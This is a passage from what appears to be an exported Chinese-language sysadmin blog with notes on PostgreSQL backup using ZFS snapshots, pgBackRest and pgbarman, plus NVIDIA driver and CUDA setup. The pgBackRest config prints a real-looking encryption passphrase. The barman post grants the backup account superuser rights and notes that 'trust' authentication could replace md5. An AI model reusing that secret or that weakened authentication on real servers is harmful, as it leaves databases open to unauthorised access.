0.0.0.0:5432 0.0.0.0:* LISTEN - tcp6 0 0 :::5432 :::* LISTEN - 2019-09-06 10:39:13 [changch@hqdc034 ~]$ 這次就沒問題？看來是我第一次下指令的時候，不該用sudo netstat -antlp 去檢查？ anyway ，回到psql 來看看內容\npostgres@hqdc034:~$ time psql -c \u0026#39;select count(*) from test;\u0026#39; count ---------- 10000000 (1 row) real\t0m4.716s user\t0m0.028s sys\t0m0.004s postgres@hqdc034:~$ Good ，clone 出來的果然是1000萬筆資料時的狀態\n這次測試就先到此為止，後面再來測試zfs的 replication and send/recv\n","date":"2019-09-06T10:42:11+08:00","permalink":"https://h.cowbay.org/post/postgresql-backup-restore-using-zfs-snapshot/","title":"[筆記] 用zfs的snapshot 快照功能來做 postgresql 的備份還原 / Postgresql Backup Restore Using Zfs Snapshot"},{"content":"這兩天在測試pgbackrest ，簡單筆記一下測試狀況\ninstall 在ubuntu 18.04 安裝pgbackrest 很簡單，內建在apt裡面，所以可以直接用\nsudo apt install pgbackrest 進行安裝\nconfig pgbackrest 的設定檔在 /etc/pgbackrest/pgbackrest.conf 如果是用apt 安裝，預設會建立一個 /etc/pgbackrest.conf 但是這個路徑是錯誤的 執行 pgbackrest的時候，預設還是會去讀取 /etc/pgbackrest/pgbackrest.conf 要特別注意，要不就是每次都指定config路徑，要不就是把那個錯誤的設定檔幹掉\nconfig 內容 內容其實很簡單\npostgres@hqdc039:~$ cat /etc/pgbackrest/pgbackrest.conf [demo] pg1-path=/database/11/main [global] repo1-cipher-pass=zWaf6XtpjIVZC5444yXB+cgFDFl7MxGlgkZSaoPvTGirhPygu4jOKOXf9LO4vjfO repo1-cipher-type=aes-256-cbc repo1-path=/var/lib/pgbackrest repo1-retention-full=2 [global:archive-push] compress-level=3 process-max=4 [demo] 用來指定這個 \u0026ldquo;stanza\u0026rdquo; 的名稱\npg1-path 是資料庫存放的路徑 [global] 中的兩個cipher 用途我不清楚，不設定也沒關係\n\u0026ldquo;repo1-path\u0026rdquo; 則是用來存放備份的路徑 \u0026ldquo;repo1-retention-full\u0026rdquo; 定義要保留幾次 full backup [global:archive-push] 似乎是用來定義在備份/還原時的選項\nprocess-max 指定要用多少process (平行處理) 簡單流程 config (pgbackrest \u0026amp; postgresql ) 建立 stanza 建立備份 (還原，如果有需要的話) 其他部份 清除 stanza (刪除備份) 踩到的地雷 設定 pgbackrest \u0026amp; postgresql pgbackrest 基本上設定很簡單，內容就跟上面的一樣就可以跑了。 當然要新增其他進階的，就要自己研究了，內容有夠長 https://pgbackrest.org/configuration.html\n在postgresql 中，要新增一些設定，主要是 archive_command\npostgres@hqdc039:~$ grep -A 100 \u0026#34;for pgbackrest\u0026#34; /etc/postgresql/11/main/postgresql.conf #for pgbackrest archive_command = \u0026#39;pgbackrest --stanza=demo archive-push %p\u0026#39; archive_mode = on listen_addresses = \u0026#39;*\u0026#39; log_line_prefix = \u0026#39;\u0026#39; max_wal_senders = 3 wal_level = replica postgres@hqdc039:~$ archive_command 這個因為要帶stanza 名稱進來，所以需要跟pgbackrest.conf 裡面定義的名稱一致\nmax_wal_senders 簡單說就是定義在抄寫wal 的時候，可以同時抄給幾台 這是postgresql 的說明\nthe maximum number of simultaneously running WAL sender processes wal_level 有三種等級，參考 https://blog.csdn.net/pg_hgdb/article/details/78666719\nminimal \u0026ndash;不能通过基础备份和wal日志恢复数据库。 replica = 9.6版本以前的archive和hot_standby \u0026ndash;该级别支持wal归档和复制。 logical \u0026ndash;在replica级别的基础上添加了支持逻辑解码所需的信息。 設定完成後，重起 postgresql 就可以了\n建立 stanza stanza 這名詞我是第一次聽到，直接翻譯就是 \u0026quot;\u0026quot;（詩的）節，段\u0026quot;\nhttps://dictionary.cambridge.org/zht/%E8%A9%9E%E5%85%B8/%E8%8B%B1%E8%AA%9E-%E6%BC%A2%E8%AA%9E-%E7%B9%81%E9%AB%94/stanza\n在pgbackrest中，可以一次定義多個 stanza，用來備份不同的DB 這次環境很簡單，所以就只有設定一個 依照上面的pgbackrest.conf 內容設定好了，需要先建立這個stanza 指令:\npostgres@hqdc039:~$ pgbackrest --stanza=demo stanza-create --log-level-console=detail 2019-09-04 16:21:40.700 P00 INFO: stanza-create command begin 2.16: --log-level-console=detail --pg1-path=/database/11/main --repo1-cipher-pass=\u0026lt;redacted\u0026gt; --repo1-cipher-type=aes-256-cbc --repo1-path=/var/lib/pgbackrest --stanza=demo 2019-09-04 16:21:41.525 P00 INFO: stanza-create command end: completed successfully (825ms) postgres@hqdc039:~$ 接著就可以執行備份了\nbackup 備份指令也很簡單，要注意的是，如果不帶參數，pgbackrest 會自行決定要用incremental或者是 full backup\npostgres@hqdc039:~$ pgbackrest --stanza=demo --log-level-console=detail backup 2019-09-04 16:41:17.458 P00 INFO: backup command begin 2.16: --log-level-console=detail --pg1-path=/database/11/main --repo1-cipher-pass=\u0026lt;redacted\u0026gt; --repo1-cipher-type=aes-256-cbc --repo1-path=/var/lib/pgbackrest --repo1-retention-full=2 --stanza=demo 2019-09-04 16:41:17.697 P00 INFO: last backup label = 20190904-134245F, version = 2.16 2019-09-04 16:41:18.607 P00 INFO: execute non-exclusive pg_start_backup() with label \u0026#34;pgBackRest backup started at 2019-09-04 16:41:17\u0026#34;: backup begins after the next regular checkpoint completes 2019-09-04 16:41:19.008 P00 INFO: backup start archive = 000000100000000E0000004A, lsn = E/4A000028 WARN: a timeline switch has occurred since the last backup, enabling delta checksum 2019-09-04 16:41:21.213 P01 DETAIL: match file from prior backup /database/11/main/base/51435/51488 (546.3MB, 20%) checksum 5eb4f73d9b1c535ebfdfb622d930dade87e23786 2019-09-04 16:41:21.821 P01 DETAIL: match file from prior backup /database/11/main/base/51435/51460 (455.3MB, 37%) checksum aa74bba2bea8823789ad4194e4574b44a020271a ... ... ... 2019-09-04 16:41:24.827 P01 DETAIL: match file from prior backup /database/11/main/PG_VERSION (3B, 100%) checksum dd71038f3463f511ee7403dbcbc87195302d891c 2019-09-04 16:41:24.835 P01 INFO: backup file /database/11/main/base/13125/51569 (0B, 100%) 2019-09-04 16:41:24.860 P00 INFO: incr backup size = 2.5GB 2019-09-04 16:41:24.860 P00 INFO: execute non-exclusive pg_stop_backup() and wait for all WAL segments to archive 2019-09-04 16:41:24.961 P00 INFO: backup stop archive = 000000100000000E0000004A, lsn = E/4A000130 2019-09-04 16:41:24.964 P00 DETAIL: wrote \u0026#39;pg_data/backup_label\u0026#39; file returned from pg_stop_backup() 2019-09-04 16:41:25.155 P00 INFO: new backup label = 20190904-134245F_20190904-164117I 2019-09-04 16:41:25.194 P00 INFO: backup command end: completed successfully (7736ms) 2019-09-04 16:41:25.194 P00 INFO: expire command begin 2019-09-04 16:41:25.214 P00 INFO: full backup total \u0026lt; 2 - using oldest full backup for 11-1 archive retention 2019-09-04 16:41:25.214 P00 DETAIL: archive retention on backup 20190904-134245F, archiveId = 11-1, start = 0000000D0000000E00000048 2019-09-04 16:41:25.215 P00 DETAIL: no archive to remove, archiveId = 11-1 2019-09-04 16:41:25.215 P00 INFO: expire command end: completed successfully (21ms) postgres@hqdc039:~$ 執行後，可以檢查一下\npostgres@hqdc039:~$ pgbackrest --stanza=demo --log-level-console=info info stanza: demo status: ok cipher: aes-256-cbc db (current) wal archive min/max (11-1): 0000000D0000000E00000048/000000100000000E0000004A full backup: 20190904-134245F timestamp start/stop: 2019-09-04 13:42:45 / 2019-09-04 13:48:54 wal start/stop: 0000000D0000000E00000048 / 0000000D0000000E00000048 database size: 2.6GB, backup size: 2.6GB repository size: 547MB, repository backup size: 547MB incr backup: 20190904-134245F_20190904-164117I timestamp start/stop: 2019-09-04 16:41:17 / 2019-09-04 16:41:25 wal start/stop: 000000100000000E0000004A / 000000100000000E0000004A database size: 2.6GB, backup size: 2.2MB repository size: 547MB, repository backup size: 220.4KB backup reference list: 20190904-134245F postgres@hqdc039:~$ 還原測試 pgbackrest 的還原因為透過WAL ，所以有一些觀念需要先釐清 本來我的測試是先做好備份，然後直接砍掉 DB，接著再用restore還原 卻發現砍掉的DB居然沒有回來.. 後來看了這一篇，然後又研究了一下 Point-in-Time Recovery https://github.com/pgbackrest/pgbackrest/issues/800 才找到正確的用法\n先把DB整個砍掉\npostgres@hqdc034:/zp/database$ time dropdb demo 然後停止postgresql 服務\npostgres@hqdc034:/zp/database$ pg_ctlcluster 10 main stop sudo systemctl stop postgresql@10-main 接著就可以來下指令還原了\npostgres@hqdc034:/zp/database$ time pgbackrest --stanza=demo --log-level-console=info --delta --type=time \u0026#34;--target=2019-09-05 11:00:00.268248+08\u0026#34; --target-action=promote restore 2019-09-05 11:15:57.480 P00 INFO: restore command begin 2.13: --delta --log-level-console=info --pg1-path=/zp/database/10/main --process-max=4 --repo1-path=/var/lib/pgbackrest --stanza=demo --target=\u0026#34;2019-09-05 11:00:00.268248+08\u0026#34; --target-action=promote --type=time 2019-09-05 11:15:57.624 P00 INFO: restore backup set 20190905-111109F 2019-09-05 11:15:57.947 P00 INFO: remove invalid files/paths/links from /zp/database/10/main 2019-09-05 11:16:00.440 P01 INFO: restore file /zp/database/10/main/global/pg_control.pgbackrest.tmp (8KB, 99%) checksum e253f9d706ac59e1ec0408ba477d1d5bac41b20f 2019-09-05 11:16:00.791 P00 INFO: write /zp/database/10/main/recovery.conf 2019-09-05 11:16:00.797 P00 INFO: restore global/pg_control (performed last to ensure aborted restores cannot be started) 2019-09-05 11:16:00.800 P00 INFO: restore command end: completed successfully (3321ms) real\t0m3.328s user\t0m6.896s sys\t0m0.832s 在DB目錄中，會產生一個recovery.conf，這是用來給 postgresql 看的檔案，裡面會紀錄怎麼還原、以及還原的類型、時間點，這邊指定要恢復到 2019-09-05 11:00:00.268248+08 這個時間格式要看資料庫的設定，可以藉由以下指令得到\npostgres@hqdc034:/zp/database$ psql -Atc \u0026#34;select current_timestamp\u0026#34; 2019-09-05 11:14:27.268248+08 檢查一下recovery.conf\npostgres@hqdc034:/zp/database$ cat /zp/database/10/main/recovery.conf restore_command = \u0026#39;pgbackrest --log-level-console=info --stanza=demo archive-get %f \u0026#34;%p\u0026#34;\u0026#39; recovery_target_time = \u0026#39;2019-09-05 11:00:00.268248+08\u0026#39; recovery_target_action = \u0026#39;promote\u0026#39; 重新啟動postgresql 然後看看被砍掉的demo DB有沒有回來\npostgres@hqdc034:/zp/database$ pg_ctlcluster 10 main start Warning: the cluster will not be running as a systemd service. Consider using systemctl: sudo systemctl start postgresql@10-main postgres@hqdc034:/zp/database$ psql psql (10.8 (Ubuntu 10.8-1.pgdg14.04+1)) Type \u0026#34;help\u0026#34; for help. postgres=# \\l List of databases Name | Owner | Encoding | Collate | Ctype | Access privileges -----------+----------+----------+-------------+-------------+----------------------- demo | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | postgres | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | template0 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres + | | | | | postgres=CTc/postgres template1 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres + | | | | | postgres=CTc/postgres (4 rows) postgres=# \\q postgres@hqdc034:/zp/database$ 很好， demo DB 有順利的還原回來了，先暫時測試到這邊。接下來要來玩postgresql on zfs\n後續如果想更深入測試 pgbackrest，可以試試看異機備份還原。\n","date":"2019-09-05T11:42:28+08:00","permalink":"https://h.cowbay.org/post/backup-restore-postgresql-with-pgbackrest/","title":"[筆記] 用pbackrest 備份還原 postgresql / Backup Restore Postgresql With Pgbackrest"},{"content":"這篇繼續講 pgbarman 透過 rsync/ssh 來備份 postgresql 資料庫的方式\n其實呢，透過 ssh 的方式來做備份，雖然最後有弄出來，但是我不知道到底做了什麼事才搞定\n也許要重新安裝一台來測試看看\n所以就簡單說一下邏輯、記得的指令、還有最後的config\nssh 在db server 上，讓 barman server 可以用barman 帳號透過ssh key 登入 postgres 帳號 然後在 barman server 上，讓 db server 可以用postgres帳號透過 ssh key 登入 barman 帳號\nbarman.d 在/etc/barman.d/ 底下新增一個hqs019-ssh.conf\n內容如下\n[hqs019-ssh] description = \u0026#34;hqs019 (via SSH)\u0026#34; ssh_command = ssh postgres@hqs019 conninfo = host=hqs019 user=barman dbname=database_name backup_method = rsync reuse_backup = link parallel_jobs = 5 archiver = on postgresql.conf 新增跟barman有關的設定如下\n### for barman test wal_level = \u0026#39;archive\u0026#39; archive_mode = on archive_command = \u0026#39;rsync -a %p barman@192.168.11.192:/var/lib/barman/hqs019-ssh/incoming/%f\u0026#39; 理論上這樣就可以了，但是實際上碰到很多問題\n主要都是這個錯誤訊息\nWAL archive: FAILED (please make sure WAL shipping is setup) 碰到這狀況，google 都會告訴你，在 postgresql.conf 裡面 archive_command 的路徑，要和 barman server 上的設定一致 但是我的路徑就沒有問題，還是一直跳這個錯誤\n接著我又在 barman server 這邊做了這些事情\nbarman check hqs019-ssh barman check hqs019-ssh barman check hqs019-ssh ssh postgres@hqs019 barman check hqs019-ssh barman show-server hqs019-ssh |grep incoming_wals_directory barman show-server all barman cron barman switch-xlog hqs019-ssh barman check hqs019-ssh psql -c \u0026#39;SELECT version()\u0026#39; -U postgres -h hqs019 psql -c \u0026#39;SELECT version()\u0026#39; -U barman -h hqs019 psql -c \u0026#39;SELECT version()\u0026#39; -U barman -h hqs019 -d database_name barman check hqs019-ssh barman check hqs019-ssh barman bachup hqs019-ssh barman backup hqs019-ssh barman list-backup hqs019-ssh df -h barman backup hqs019-ssh barman show-server hqs019 barman check hqs019 前面幾次 barman check 一直都不通過\n然後在 barman cron / barman switch-xlog hqs019-ssh (其實這個動作我做過好多次)\n想說確認一下psql 連接是不是正確(也的確正確無誤)\n接著第一次 check 還是FAILED 喔，過沒多久我再跑一次 check 又正常了\u0026hellip; WTF !!!\n只要check 正常，接著跑 backup 應該就會很順利\nbarman@barman:~$ barman backup hqs019-ssh Starting backup using rsync-exclusive method for server hqs019-ssh in /var/lib/barman/hqs019-ssh/base/20190823T113229 Backup start at LSN: 264/B7000028 (0000000100000264000000B7, 00000028) This is the first backup for server hqs019-ssh WAL segments preceding the current backup have been found: 0000000100000264000000B5 from server hqs019-ssh has been removed Starting backup copy via rsync/SSH for 20190823T113229 (5 jobs) Copy done (time: 1 hour, 5 minutes, 39 seconds) This is the first backup for server hqs019-ssh WAL segments preceding the current backup have been found: 0000000100000264000000B6 from server hqs019-ssh has been removed Asking PostgreSQL server to finalize the backup. Backup size: 132.9 GiB. Actual size on disk: 132.9 GiB (-0.00% deduplication ratio). Backup end at LSN: 264/B7000130 (0000000100000264000000B7, 00000130) Backup completed (start time: 2019-08-23 11:32:30.078310, elapsed time: 1 hour, 5 minutes, 43 seconds) Processing xlog segments from file archival for hqs019-ssh 0000000100000264000000B7 0000000100000264000000B7.00000028.backup barman@barman:~$ 檢查一下狀態\nbarman@barman:~$ barman list-backup hqs019-ssh hqs019-ssh 20190823T113229 - Thu Aug 22 20:38:13 2019 - Size: 132.9 GiB - WAL Size: 0 B (tablespaces: tablespace_a:/var/lib/postgresql/10/main/tablespace_A, tablespace_b:/var/lib/postgresql/10/main/tablespace_B) 然後為了驗證是不是跑增量備份，所以再執行一次 backup\nbarman@barman:~$ barman backup hqs019-ssh Starting backup using rsync-exclusive method for server hqs019-ssh in /var/lib/barman/hqs019-ssh/base/20190823T132124 Backup start at LSN: 264/B9000028 (0000000100000264000000B9, 00000028) Starting backup copy via rsync/SSH for 20190823T132124 (5 jobs) Copy done (time: 5 seconds) Asking PostgreSQL server to finalize the backup. Backup size: 132.9 GiB. Actual size on disk: 14.2 KiB (-100.00% deduplication ratio). Backup end at LSN: 264/B9000130 (0000000100000264000000B9, 00000130) Backup completed (start time: 2019-08-23 13:21:24.455819, elapsed time: 9 seconds) Processing xlog segments from file archival for hqs019-ssh 0000000100000264000000B8 0000000100000264000000B9 0000000100000264000000B9.00000028.backup barman@barman:~$ 可以發現第一次跑了一個多小時，第二次只跑了五秒鐘 (因為資料庫根本沒異動)\n到這邊雖然功能驗證沒有問題，可是不知道怎麼弄出來的，還是讓我很阿雜..\n應該會再找時間來重作一台，然後順便測試看看restore\nupdate\n剛剛又做了一次測試，config 都一樣\n果然要先做 barman cron/barman switch-xlog hqs019-ssh\n然後再做 barman check 就可以通過了\n在文件裡面很少提到這部份，筆記一下，用ansible 去跑的時候才不會忘記\n","date":"2019-08-23T14:54:13+08:00","permalink":"https://h.cowbay.org/post/pgbarman-in-ubuntu-1804-postgresql-10-via-ssh/","title":"[筆記] 在Ubuntu 18.04 下 透過 pgbarman rsync/ssh backup 備份 postgresql 10 / backup postgresql 10 with pgbarman via ssh/rsync in ubuntu 18.04"},{"content":"很久以前就有看到這個用來備份postgresql 的 pgbarman\nhttps://www.pgbarman.org/\n前幾天老闆在slack 上面又提到，所以這次就花了點時間來玩玩看\n不過呢，雖然有弄起來，但是還真不知道有些問題是怎麼解決的\u0026hellip;\npgbarman 的備份有分兩種\nstreaming \u0026amp;\u0026amp; rsync/SSH\n原理就不說了，我一直沒搞懂 postgresql 的 streaming ..\n依照官方網站上的說法，比較推薦 streaming 備份的方式\n原因是，設定相對簡單，WTF !\nOn a general basis, starting from Barman 2.0, backup over streaming replication is the recommended setup for PostgreSQL 9.4 or higher The reason why we recommend streaming backup is that, based on our experience, it is easier to setup than the traditional one 事實上呢，設定的確是很簡單，可是有個致命的缺點\nBecause Barman transparently makes use of pg_basebackup, features such as incremental backup, parallel backup, deduplication, and network compression are currently not available. In this case, bandwidth limitation has some restrictions - compared to the traditional method via rsync. 如果要做差異/增量備份， streaming backup 不能做\n所以每次備份都是完整備份，也因此，barman server 需要準備很大的硬碟空間\n以我測試的資料庫來說，一次備份，目前是133G ，如果一天四次，保留七天\n就需要 133 x 4 x 7 = 3724G\n咦，這樣看起來，其實也還好啦 XDD\n現在開始設定的部份\n設定 postgresql server IP: 192.168.11.19 hostname: hqs019\n在postgresql 建立相關帳號 streaming backup 需要先在postgresql Server 上建立一個具有 superuser 權限的帳號\n以及一個用來做replication 的資料庫帳號\n這裡就簡單帶過\nsudo su - postgres psql create user barman with login superuser login password \u0026#39;barmanpassword\u0026#39;; CREATE ROLE stream_barman WITH REPLICATION PASSWORD \u0026#39;password\u0026#39; LOGIN; 鄉改 pg_hba.conf 然後修改 pg_hba.conf，加入底下兩行\n# for barman test host database_name barman 192.168.11.192/32 md5 host replication stream_barman 192.168.11.192/32 md5 當然，如果不考慮安全性問題， md5 直接改成用 trust ，可以省去一些麻煩。\n修改 postgresql.conf 接著修改postgresql.conf\n### for barman test max_wal_senders = 5 max_replication_slots = 3 wal_level = \u0026#39;archive\u0026#39; archive_mode = on 重起 postgresql service\n設定barman server IP: 192.168.11.192 hostname: barman\n安裝 barman barman 在18.04 中，已經被放到標準repository 中\n所以只要直接\nsudo apt install barman 就可以了\n設定 barman.conf 安裝完成後，在/etc/barman.d/ 底下會有兩個範例檔案\nstreaming-server.conf-template ssh-server.conf-template 複製 streaming-server 檔案\nsudo cp /etc/barman.d/streaming-server.conf-template /etc/barman.d/hqs019.conf 內容如下\n[hqs019] description = \u0026#34;hqs019 \u0026#34; conninfo = host=192.168.11.19 user=barman dbname=database_name password=barmanpassword streaming_conninfo = host=192.168.11.19 user=stream_barman dbname=database_name password=password backup_method = postgres retention_policy_mode = auto streaming_archiver = on slot_name = barman 接著修改 /etc/barman.conf\n[barman] barman_user = barman configuration_files_directory = /etc/barman.d barman_home = /var/lib/barman log_file = /var/log/barman/barman.log log_level = DEBUG compression = gzip immediate_checkpoint = true basebackup_retry_times = 3 basebackup_retry_sleep = 30 last_backup_maximum_age = 1 DAYS 基本上這樣就設定完成了\n檢查設定 barman 有一些指令可以用來檢查目前的設定\nbarman show-server hqs019 可以看到所有的設定，這裡的 hqs019 跟 barman.d/hqs019.conf 裡面用\u0026quot;[ ]\u0026quot; 包起來的名稱要一致\nbarman@barman:~$ barman show-server hqs019 Server hqs019: active: True archiver: False archiver_batch_size: 0 backup_directory: /var/lib/barman/hqs019 backup_method: postgres backup_options: BackupOptions([\u0026#39;concurrent_backup\u0026#39;]) bandwidth_limit: None barman_home: /var/lib/barman barman_lock_directory: /var/lib/barman basebackup_retry_sleep: 30 basebackup_retry_times: 3 basebackups_directory: /var/lib/barman/hqs019/base check_timeout: 30 compression: gzip config_file: /etc/postgresql/10/main/postgresql.conf connection_error: None conninfo: host=192.168.11.19 user=barman dbname=database_name password=barmanpassword current_size: 142740768562 current_xlog: 0000000100000264000000BA custom_compression_filter: None custom_decompression_filter: None data_directory: /database description: hqs019 disabled: False errors_directory: /var/lib/barman/hqs019/errors hba_file: /etc/postgresql/10/main/pg_hba.conf ident_file: /etc/postgresql/10/main/pg_ident.conf immediate_checkpoint: True incoming_wals_directory: /var/lib/barman/hqs019/incoming is_in_recovery: False is_superuser: True last_backup_maximum_age: 1 day (WARNING! latest backup is No available backups old) max_incoming_wals_queue: None minimum_redundancy: 0 msg_list: [] name: hqs019 network_compression: False parallel_jobs: 1 path_prefix: None pg_basebackup_bwlimit: True pg_basebackup_compatible: True pg_basebackup_installed: True pg_basebackup_path: /usr/bin/pg_basebackup pg_basebackup_tbls_mapping: True pg_basebackup_version: 10.10-0ubuntu0.18.04.1) pg_receivexlog_compatible: True pg_receivexlog_installed: True pg_receivexlog_path: /usr/bin/pg_receivewal pg_receivexlog_supports_slots: True pg_receivexlog_synchronous: False pg_receivexlog_version: 10.10-0ubuntu0.18.04.1) pgespresso_installed: False post_archive_retry_script: None post_archive_script: None post_backup_retry_script: None post_backup_script: None pre_archive_retry_script: None pre_archive_script: None pre_backup_retry_script: None pre_backup_script: None recovery_options: RecoveryOptions([]) replication_slot: Record(slot_name=\u0026#39;barman\u0026#39;, active=True, restart_lsn=\u0026#39;264/BA000000\u0026#39;) replication_slot_support: True retention_policy: None retention_policy_mode: auto reuse_backup: None server_txt_version: 10.10 slot_name: barman ssh_command: None streaming: True streaming_archiver: True streaming_archiver_batch_size: 0 streaming_archiver_name: barman_receive_wal streaming_backup_name: barman_streaming_backup streaming_conninfo: host=192.168.11.19 user=stream_barman dbname=database_name password=password streaming_supported: True streaming_wals_directory: /var/lib/barman/hqs019/streaming synchronous_standby_names: [\u0026#39;\u0026#39;] systemid: 6688476041000599317 tablespace_bandwidth_limit: None timeline: 1 wal_level: replica wal_retention_policy: main wals_directory: /var/lib/barman/hqs019/wals xlogpos: 264/BA000F08 然後用 barman check hqs019 來檢查config 有沒有問題\nbarman@barman:~$ barman check hqs019 Server hqs019: PostgreSQL: OK is_superuser: OK PostgreSQL streaming: OK wal_level: OK replication slot: OK directories: OK retention policy settings: OK backup maximum age: FAILED (interval provided: 1 day, latest backup age: No available backups) compression settings: OK failed backups: OK (there are 0 failed backups) minimum redundancy requirements: OK (have 0 backups, expected at least 0) pg_basebackup: OK pg_basebackup compatible: OK pg_basebackup supports tablespaces mapping: OK pg_receivexlog: OK pg_receivexlog compatible: OK receive-wal running: OK archiver errors: OK barman@barman:~$ 那個backup maximum age FAILED 不用管他，因為都還沒跑過備份，這邊錯誤是正常的\n其他都OK 的話，就可以開始備份了\nbarman backup hqs019\nbarman@ubuntu:~$ barman backup hqs019 Starting backup using postgres method for server hqs019 in /var/lib/barman/hqs019/base/20190823T082258 Backup start at LSN: 264/A10001A8 (0000000100000264000000A1, 000001A8) Starting backup copy via pg_basebackup for 20190823T082258 WARNING: pg_basebackup does not copy the PostgreSQL configuration files that reside outside PGDATA. Please manually backup the following files: /etc/postgresql/10/main/postgresql.conf /etc/postgresql/10/main/pg_hba.conf /etc/postgresql/10/main/pg_ident.conf Copy done (time: 1 hour, 6 minutes, 28 seconds) Finalising the backup. Backup size: 133.0 GiB Backup end at LSN: 264/A3000060 (0000000100000264000000A3, 00000060) Backup completed (start time: 2019-08-23 08:22:58.116372, elapsed time: 1 hour, 6 minutes, 28 seconds) Processing xlog segments from streaming for hqs019 0000000100000264000000A2 barman@ubuntu:~$ 跑完可以用 barman list-backup hqs019 檢查\nbarman@ubuntu:~$ barman list-backup hqs019 hqs019 20190823T082258 - Thu Aug 22 17:29:26 2019 - Size: 133.0 GiB - WAL Size: 0 B (tablespaces: tablespace_a:/var/lib/postgresql/10/main/tablespace_A, tablespace_b:/var/lib/postgresql/10/main/tablespace_B) 要刪除的話，要加入 backupID\nbarman@ubuntu:~$ barman delete hqs019 20190822T171355 Deleting backup 20190822T171355 for server hqs019 Delete associated WAL segments: 00000001000002640000009F 0000000100000264000000A0 0000000100000264000000A1 Deleted backup 20190822T171355 (start time: Fri Aug 23 09:36:43 2019, elapsed time: 3 seconds) restore 的部份，暫時沒有測試，我想應該是要找時間測試看看怎麼還原才對\n不過呢，前面有提到，用streaming backup ，每一次備份都是完整備份，非常的佔用空間、時間、頻寬\n所以還是要來試試看用rsync/SSH 備份的機制\n","date":"2019-08-23T13:53:40+08:00","permalink":"https://h.cowbay.org/post/pgbarman-in-ubuntu-1804-postgresql-10/","title":"[筆記] 在Ubuntu 18.04 下 透過 pgbarman streaming backup 備份 postgresql 10/ backup postgresql 10 with pgbarman straming backup in ubuntu 18.04"},{"content":"因為老闆說要試試看用GPU 來跑postgresql 威力\n手邊剛好有一張 geforce gt 720\n一開始沒想太多，看到有這張卡的驅動程式，然後CUDA也有支援\n就直接從桌機拔下來，接去LAB Server ，然後就開始一連串的難關了\u0026hellip;\n整個過程大致上分為四個步驟\n安裝 nvidia driver 安裝 CUDA 安裝 postgresql 安裝 pgstrom 安裝 nvidia driver 試過幾種方法，最後還是覺得用apt來安裝比較妥當 先新增repository、update、裝driver\nsudo add-apt-repository ppa:graphics-drivers/ppa sudo apt update sudo apt install ubuntu-drivers-common 然後用這個指令\nubuntu-drivers devices 看一下現在的驅動程式狀態\nadministrator@hqdc032:~/pg-strom$ ubuntu-drivers devices == /sys/devices/pci0000:00/0000:00:01.0/0000:01:00.0 == modalias : pci:v000010DEd00001288sv0000174Bsd0000326Bbc03sc00i00 vendor : NVIDIA Corporation model : GK208B [GeForce GT 720] driver : nvidia-driver-410 - third-party free driver : nvidia-driver-418 - third-party free driver : nvidia-340 - distro non-free driver : nvidia-driver-430 - third-party free recommended driver : nvidia-driver-390 - third-party free driver : nvidia-driver-415 - third-party free driver : xserver-xorg-video-nouveau - distro free builtin 我這張卡，可以裝到 430 的版本， 接下來就繼續安裝驅動程式、裝完之後重開機\nsudo apt install nvidia-driver-430 sudo reboot 這時候，應該可以看到一些基本資訊\nlsmod|grep nvidia 大概長這樣\nnvidia_uvm 798720 0 nvidia_drm 45056 3 nvidia_modeset 1093632 7 nvidia_drm nvidia 18194432 258 nvidia_uvm,nvidia_modeset drm_kms_helper 172032 1 nvidia_drm drm 401408 6 drm_kms_helper,nvidia_drm ipmi_msghandler 53248 2 ipmi_devintf,nvidia 到這邊 nvidia 驅動程式安裝完成，接下來安裝 cuda\n安裝 CUDA 同樣採用官網下載deb 回來安裝的方法\n到這邊 https://developer.nvidia.com/cuda-downloads\n依照自己的系統選擇\n我選擇 Linux \u0026ndash; x86_64 \u0026ndash; Ubuntu \u0026ndash; 18.04 \u0026ndash; deb(local)\n畫面上就會有安裝步驟，照著做就沒問題了\nwget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-ubuntu1804.pin sudo mv cuda-ubuntu1804.pin /etc/apt/preferences.d/cuda-repository-pin-600 wget http://developer.download.nvidia.com/compute/cuda/10.1/Prod/local_installers/cuda-repo-ubuntu1804-10-1-local-10.1.243-418.87.00_1.0-1_amd64.deb sudo dpkg -i cuda-repo-ubuntu1804-10-1-local-10.1.243-418.87.00_1.0-1_amd64.deb sudo apt-key add /var/cuda-repo-10-1-local-10.1.243-418.87.00/7fa2af80.pub sudo apt-get update sudo apt-get -y install cuda 一樣，安裝完成後重新開機，然後來編譯一個 deviceQuery 的小程式來看看資訊\ncd /usr/local/cuda-10.1/samples/1_Utilities/deviceQuery sudo make 會產生一個叫 deviceQuery 的執行檔，執行後，會有相關資訊\nadministrator@hqdc032:/usr/local/cuda-10.1/samples/1_Utilities/deviceQuery$ ./deviceQuery ./deviceQuery Starting... CUDA Device Query (Runtime API) version (CUDART static linking) Detected 1 CUDA Capable device(s) Device 0: \u0026#34;GeForce GT 720\u0026#34; CUDA Driver Version / Runtime Version 10.1 / 10.1 CUDA Capability Major/Minor version number: 3.5 Total amount of global memory: 1996 MBytes (2093416448 bytes) ( 1) Multiprocessors, (192) CUDA Cores/MP: 192 CUDA Cores GPU Max Clock rate: 797 MHz (0.80 GHz) Memory Clock rate: 900 Mhz Memory Bus Width: 64-bit L2 Cache Size: 524288 bytes Maximum Texture Dimension Size (x,y,z) 1D=(65536), 2D=(65536, 65536), 3D=(4096, 4096, 4096) Maximum Layered 1D Texture Size, (num) layers 1D=(16384), 2048 layers Maximum Layered 2D Texture Size, (num) layers 2D=(16384, 16384), 2048 layers Total amount of constant memory: 65536 bytes Total amount of shared memory per block: 49152 bytes Total number of registers available per block: 65536 Warp size: 32 Maximum number of threads per multiprocessor: 2048 Maximum number of threads per block: 1024 Max dimension size of a thread block (x,y,z): (1024, 1024, 64) Max dimension size of a grid size (x,y,z): (2147483647, 65535, 65535) Maximum memory pitch: 2147483647 bytes Texture alignment: 512 bytes Concurrent copy and kernel execution: Yes with 1 copy engine(s) Run time limit on kernels: Yes Integrated GPU sharing Host Memory: No Support host page-locked memory mapping: Yes Alignment requirement for Surfaces: Yes Device has ECC support: Disabled Device supports Unified Addressing (UVA): Yes Device supports Compute Preemption: No Supports Cooperative Kernel Launch: No Supports MultiDevice Co-op Kernel Launch: No Device PCI Domain ID / Bus ID / location ID: 0 / 1 / 0 Compute Mode: \u0026lt; Default (multiple host threads can use ::cudaSetDevice() with device simultaneously) \u0026gt; deviceQuery, CUDA Driver = CUDART, 